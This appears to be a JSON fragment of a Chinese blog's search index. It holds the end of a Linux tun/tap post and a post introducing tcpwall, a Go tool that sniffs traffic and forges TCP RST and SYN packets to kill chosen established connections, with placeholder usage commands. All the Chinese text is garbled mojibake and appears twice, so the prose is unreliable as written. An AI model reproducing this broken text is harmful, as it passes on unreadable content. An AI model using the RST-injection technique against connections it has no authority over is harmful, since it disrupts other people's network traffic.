style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# åˆ é™¤ tap\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip tuntap del dev tap0 mode tap\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# åˆ é™¤ tun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eip tuntap del dev tun0 mode tun \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003etun/tap è®¾å¤‡åˆ›å»ºæˆåŠŸåå¯ä»¥å½“ä½œæ™®é€šçš„ç½‘å¡ä¸€æ ·ä½¿ç”¨ï¼Œå› æ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡\u003ccode\u003eip link\u003c/code\u003eå‘½ä»¤æ¥æ“ä½œå®ƒã€‚\u003c/p\u003e","title":"Linux tun/tap è¯¦è§£"},{"content":"tcpwall å½“æˆ‘ä»¬æƒ³è¦é˜»æ­¢æŸäº›TCPè¿æ¥çš„å»ºç«‹ï¼Œåœ¨Linuxå¹³å°ä¸Šæœ‰ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆiptablesï¼Œä½†æ˜¯å¯¹é‚£äº›å·²ç»å»ºç«‹çš„tcpè¿æ¥ï¼Œiptableså°±ä¸èƒ½åšåˆ°éšå¿ƒæ‰€æ¬²çš„é˜»æ–­äº†ã€‚\næˆ‘åœ¨äº’è”ç½‘ä¸Šæ£€ç´¢çš„æ—¶å€™å‘ç°äº†tcpkillè¿™ä¸ªå·¥å…·ï¼Œtcpkillæ˜¯ä¸€ä¸ªç½‘ç»œåˆ†æå·¥å…·é›†dsniffä¸­çš„ä¸€ä¸ªå°å·¥å…·ã€‚åœ¨Linuxä¸Šå¯ä»¥ç›´æ¥é€šè¿‡dsniffåŒ…å®‰è£…ï¼Œä½¿ç”¨æ–¹å¼ä¹Ÿéå¸¸ç®€å•ã€‚\né€šè¿‡æµ‹è¯•æˆ‘å‘ç°tcpkillåœ¨æ‰§è¡Œå‘½ä»¤ä¹‹åå¹¶ä¸ä¼šç«‹åˆ»é˜»æ–­tcpè¿æ¥ï¼Œè€Œæ˜¯ç­‰å¾…æœ‰æ•°æ®ä¼ è¾“æ—¶ï¼Œæ‰ä¼šé˜»æ–­ï¼Œå› æ­¤åœ¨æ‰§è¡Œå®Œå‘½ä»¤ä¹‹åç¨‹åºå¹¶ä¸ä¼šä¸»åŠ¨é€€å‡ºï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡Ctrl+Cæ¥é€€å‡ºï¼Œè¿™å¯¹äºæŸäº›æƒ³è¦é€šè¿‡ç¨‹åºæ¥è°ƒç”¨çš„è„šæœ¬å°å­ï¼ˆä¾‹å¦‚æˆ‘ï¼‰æ¥è¯´ç®€ç›´æ˜¯ä¸ªç¾éš¾ã€‚\nå¦‚ä½•é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥ï¼Ÿ é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥é€šå¸¸æœ‰è¿™å‡ ç§æ–¹æ¡ˆï¼š\næœåŠ¡ç«¯ä¸»åŠ¨æ–­å¼€ å®¢æˆ·ç«¯ä¸»åŠ¨æ–­å¼€ æ‹”æ‰ç½‘çº¿ï¼ˆæ—¶é—´è¦è¶…è¿‡tcpè¶…æ—¶æ—¶é—´ï¼‰ ä¼ªé€ RSTæ•°æ®åŒ…å‘é€ç»™æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯è®©å®ƒä»¬ä¸»åŠ¨æ–­å¼€ï¼ˆtcpkillå°±æ˜¯è¿™ä¹ˆåšçš„ï¼‰ å‰ä¸‰ç§å±€é™æ€§å¤ªå¤§ï¼Œåªèƒ½ç”¨ç¬¬4ç§äº†ã€‚\nå¦‚ä½•å®ç°ä¼ªé€ RSTæ•°æ®æŠ¥æ–‡åŒ…ï¼Ÿ GoPacket æ˜¯goåŸºäºlibpcapæ„å»ºçš„ä¸€ä¸ªåº“ï¼Œå¯ä»¥é€šè¿‡æ—è·¯çš„æ–¹å¼æ¥æ”¶ä¸€ä»½æ•°æ®åŒ…çš„æ‹·è´ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿æ•è·åˆ°æ­£åœ¨é€šä¿¡çš„tcpæ•°æ®æŠ¥æ–‡ã€‚é€šè¿‡æ•°æ®æŠ¥æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°é€šä¿¡åŒæ–¹çš„MACåœ°å€ï¼ŒIPå’Œç«¯å£å·ï¼Œä»¥åŠACKå·ç­‰ï¼Œè¿™äº›éƒ½æ˜¯ä¼ªé€ æ•°æ®åŒ…å¿…ä¸å¯å°‘çš„ã€‚\nåœ¨å­¦ä¹ äº†tcpkillçš„æºç ä¹‹åï¼Œæˆ‘ä½¿ç”¨goå¼€å‘äº†ä¸€ä¸ªå¢å¼ºç‰ˆçš„tcpwallï¼Œtcpwallä¸ä»…å¯ä»¥å®ç°å’ŒtcpkillåŒæ ·çš„åŸºäºipæˆ–ç«¯å£ç›‘å¬åˆ°æŒ‡å®šæ•°æ®æŠ¥æ–‡ä¹‹åä¼ªé€ RSTæ•°æ®æŠ¥æ–‡æ¥é˜»æ–­tcpè¿æ¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æºipæºç«¯å£ï¼Œç›®çš„ipç›®çš„ç«¯å£æ¥ä¸»åŠ¨å‘é€SYNæ•°æ®æŠ¥æ–‡åŒ…æ¥è¯±å¯¼é‚£äº›æ²¡æœ‰æ•°æ®çš„tcpè¿æ¥å‘é€ACKæ•°æ®æŠ¥æ–‡åŒ…ä»¥è·å–æºMACã€ç›®çš„MACå’ŒACKå·ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡æŒ‡å®šå‚æ•°è®©ç¨‹åºç­‰å¾…ä¸€æ®µæ—¶é—´åä¸»åŠ¨é€€å‡ºã€‚\nå¦‚ä½•ä½¿ç”¨ é˜»æ–­æŒ‡å®šIPå’Œç«¯å£çš„TCPè¿æ¥ï¼ˆä¸å…³å¿ƒæ˜¯æºæˆ–è€…ç›®çš„ï¼‰\ntcpwall -i {interface} -host {host} -port {port} é˜»æ–­æŒ‡å®šæºIPå’Œæºç«¯å£çš„TCPè¿æ¥\ntcpwall -i {interface} -shost {src_host} -sport {src_port} é˜»æ–­æŒ‡å®šç›®çš„IPå’Œç›®çš„ç«¯å£çš„TCPè¿æ¥\ntcpwall -i {interface} -dhost {dst_host} -dport {dst_port} é˜»æ–­æŒ‡å®šæºIPã€æºç«¯å£ã€ç›®çš„IPã€ç›®çš„ç«¯å£çš„TCPè¿æ¥ï¼ˆä¼šä¸»åŠ¨å‘åŒæ–¹å‘é€SYNæ•°æ®æŠ¥æ–‡åŒ…ï¼‰\ntcpwall -i {interface} -shost {src_host} -sport {src_port} -dhost {dst_host} -dport {dst_port} å…¶ä»– -timeout æ—¶é—´ï¼ˆç§’ï¼‰æŒ‡å®šç­‰å¾…å¤šä¹…ä¹‹åé€€å‡ºç¨‹åº é¡¹ç›®åœ°å€ https://github.com/dushixiang/tcpwall\n","permalink":"https://www.typesafe.cn/posts/tcpwall/","summary":"\u003ch2 id=\"tcpwall\"\u003etcpwall\u003c/h2\u003e\n\u003cp\u003eå½“æˆ‘ä»¬æƒ³è¦é˜»æ­¢æŸäº›TCPè¿æ¥çš„å»ºç«‹ï¼Œåœ¨Linuxå¹³å°ä¸Šæœ‰ä¸€ä¸ªå¾ˆå¥½çš„è§£å†³æ–¹æ¡ˆ\u003cstrong\u003eiptables\u003c/strong\u003eï¼Œä½†æ˜¯å¯¹é‚£äº›å·²ç»å»ºç«‹çš„tcpè¿æ¥ï¼Œiptableså°±ä¸èƒ½åšåˆ°éšå¿ƒæ‰€æ¬²çš„é˜»æ–­äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘åœ¨äº’è”ç½‘ä¸Šæ£€ç´¢çš„æ—¶å€™å‘ç°äº†\u003cstrong\u003etcpkill\u003c/strong\u003eè¿™ä¸ªå·¥å…·ï¼Œtcpkillæ˜¯ä¸€ä¸ªç½‘ç»œåˆ†æå·¥å…·é›†\u003cstrong\u003edsniff\u003c/strong\u003eä¸­çš„ä¸€ä¸ªå°å·¥å…·ã€‚åœ¨Linuxä¸Šå¯ä»¥ç›´æ¥é€šè¿‡dsniffåŒ…å®‰è£…ï¼Œä½¿ç”¨æ–¹å¼ä¹Ÿéå¸¸ç®€å•ã€‚\u003c/p\u003e\n\u003cp\u003eé€šè¿‡æµ‹è¯•æˆ‘å‘ç°tcpkillåœ¨æ‰§è¡Œå‘½ä»¤ä¹‹åå¹¶ä¸ä¼šç«‹åˆ»é˜»æ–­tcpè¿æ¥ï¼Œè€Œæ˜¯ç­‰å¾…æœ‰æ•°æ®ä¼ è¾“æ—¶ï¼Œæ‰ä¼šé˜»æ–­ï¼Œå› æ­¤åœ¨æ‰§è¡Œå®Œå‘½ä»¤ä¹‹åç¨‹åºå¹¶ä¸ä¼šä¸»åŠ¨é€€å‡ºï¼Œè€Œæ˜¯éœ€è¦é€šè¿‡\u003cem\u003e\u003cstrong\u003eCtrl+C\u003c/strong\u003e\u003c/em\u003eæ¥é€€å‡ºï¼Œè¿™å¯¹äºæŸäº›æƒ³è¦é€šè¿‡ç¨‹åºæ¥è°ƒç”¨çš„è„šæœ¬å°å­ï¼ˆä¾‹å¦‚æˆ‘ï¼‰æ¥è¯´ç®€ç›´æ˜¯ä¸ªç¾éš¾ã€‚\u003c/p\u003e\n\u003ch2 id=\"å¦‚ä½•é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥\"\u003eå¦‚ä½•é˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥ï¼Ÿ\u003c/h2\u003e\n\u003cp\u003eé˜»æ–­ä¸€ä¸ªå·²ç»å»ºç«‹çš„tcpè¿æ¥é€šå¸¸æœ‰è¿™å‡ ç§æ–¹æ¡ˆï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eæœåŠ¡ç«¯ä¸»åŠ¨æ–­å¼€\u003c/li\u003e\n\u003cli\u003eå®¢æˆ·ç«¯ä¸»åŠ¨æ–­å¼€\u003c/li\u003e\n\u003cli\u003eæ‹”æ‰ç½‘çº¿ï¼ˆæ—¶é—´è¦è¶…è¿‡tcpè¶…æ—¶æ—¶é—´ï¼‰\u003c/li\u003e\n\u003cli\u003eä¼ªé€ RSTæ•°æ®åŒ…å‘é€ç»™æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯è®©å®ƒä»¬ä¸»åŠ¨æ–­å¼€ï¼ˆtcpkillå°±æ˜¯è¿™ä¹ˆåšçš„ï¼‰\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eå‰ä¸‰ç§å±€é™æ€§å¤ªå¤§ï¼Œåªèƒ½ç”¨ç¬¬4ç§äº†ã€‚\u003c/p\u003e\n\u003ch2 id=\"å¦‚ä½•å®ç°ä¼ªé€ rstæ•°æ®æŠ¥æ–‡åŒ…\"\u003eå¦‚ä½•å®ç°ä¼ªé€ RSTæ•°æ®æŠ¥æ–‡åŒ…ï¼Ÿ\u003c/h2\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/google/gopacket\"\u003eGoPacket\u003c/a\u003e æ˜¯goåŸºäº\u003cstrong\u003elibpcap\u003c/strong\u003eæ„å»ºçš„ä¸€ä¸ªåº“ï¼Œå¯ä»¥é€šè¿‡æ—è·¯çš„æ–¹å¼æ¥æ”¶ä¸€ä»½æ•°æ®åŒ…çš„æ‹·è´ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿æ•è·åˆ°æ­£åœ¨é€šä¿¡çš„tcpæ•°æ®æŠ¥æ–‡ã€‚é€šè¿‡æ•°æ®æŠ¥æ–‡ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°é€šä¿¡åŒæ–¹çš„MACåœ°å€ï¼ŒIPå’Œç«¯å£å·ï¼Œä»¥åŠACKå·ç­‰ï¼Œè¿™äº›éƒ½æ˜¯ä¼ªé€ æ•°æ®åŒ…å¿…ä¸å¯å°‘çš„ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨å­¦ä¹ äº†\u003cstrong\u003etcpkill\u003c/strong\u003eçš„æºç ä¹‹åï¼Œæˆ‘ä½¿ç”¨goå¼€å‘äº†ä¸€ä¸ªå¢å¼ºç‰ˆçš„\u003cstrong\u003etcpwall\u003c/strong\u003eï¼Œ\u003cstrong\u003etcpwall\u003c/strong\u003eä¸ä»…å¯ä»¥å®ç°å’Œ\u003cstrong\u003etcpkill\u003c/strong\u003eåŒæ ·çš„åŸºäºipæˆ–ç«¯å£ç›‘å¬åˆ°æŒ‡å®šæ•°æ®æŠ¥æ–‡ä¹‹åä¼ªé€ RSTæ•°æ®æŠ¥æ–‡æ¥é˜»æ–­tcpè¿æ¥ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æºipæºç«¯å£ï¼Œç›®çš„ipç›®çš„ç«¯å£æ¥ä¸»åŠ¨å‘é€SYNæ•°æ®æŠ¥æ–‡åŒ…æ¥è¯±å¯¼é‚£äº›æ²¡æœ‰æ•°æ®çš„tcpè¿æ¥å‘é€ACKæ•°æ®æŠ¥æ–‡åŒ…ä»¥è·å–æºMACã€ç›®çš„MACå’ŒACKå·ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡æŒ‡å®šå‚æ•°è®©ç¨‹åºç­‰å¾…ä¸€æ®µæ—¶é—´åä¸»åŠ¨é€€å‡ºã€‚\u003c/p\u003e\n\u003ch2 id=\"å¦‚ä½•ä½¿ç”¨\"\u003eå¦‚ä½•ä½¿ç”¨\u003c/h2\u003e\n\u003cp\u003eé˜»æ–­æŒ‡å®šIPå’Œç«¯å£çš„TCPè¿æ¥ï¼ˆä¸å…³å¿ƒæ˜¯æºæˆ–è€…ç›®çš„ï¼‰\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcpwall -i \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003einterface\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -host \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003ehost\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -port \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003eport\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé˜»æ–­æŒ‡å®šæºIPå’Œæºç«¯å£çš„TCPè¿æ¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcpwall -i \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003einterface\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -shost \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003esrc_host\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -sport \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003esrc_port\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé˜»æ–­æŒ‡å®šç›®çš„IPå’Œç›®çš„ç«¯å£çš„TCPè¿æ¥\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcpwall -i \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003einterface\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -dhost \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003edst_host\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -dport \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003edst_port\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé˜»æ–­æŒ‡å®šæºIPã€æºç«¯å£ã€ç›®çš„IPã€ç›®çš„ç«¯å£çš„TCPè¿æ¥ï¼ˆä¼šä¸»åŠ¨å‘åŒæ–¹å‘é€SYNæ•°æ®æŠ¥æ–‡åŒ…ï¼‰\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcpwall -i \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003einterface\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -shost \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003esrc_host\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -sport \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003esrc_port\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -dhost \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003edst_host\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e -dport \u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003edst_port\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"å…¶ä»–\"\u003eå…¶ä»–\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e-timeout æ—¶é—´ï¼ˆç§’ï¼‰æŒ‡å®šç­‰å¾…å¤šä¹…ä¹‹åé€€å‡ºç¨‹åº\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eé¡¹ç›®åœ°å€ \u003ca href=\"https://github.com/dushixiang/tcpwall\"\u003ehttps://github.com/dushixiang/tcpwall\u003c/a\u003e\u003c/p\u003e","title":"tcpkillåœ¨goè¯­è¨€ä¸‹çš„å®ç°å’Œå¢å¼º"}]